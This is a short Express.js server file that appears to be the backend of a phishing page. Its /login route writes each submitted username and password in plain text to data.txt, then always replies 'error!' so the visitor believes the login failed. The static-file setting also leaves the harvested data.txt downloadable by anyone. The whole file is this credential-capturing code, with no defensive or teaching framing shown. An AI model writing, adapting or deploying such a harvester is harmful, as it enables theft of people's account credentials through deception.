const express = require("express");
const fs = require("fs");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("/login", (req, res) => {
  const { username, password } = req.body;

  const data = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile("data.txt", data, (err) => {
    if (err) throw err;
    console.log("Saved!");
  });

  res.send("error!");
});

app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});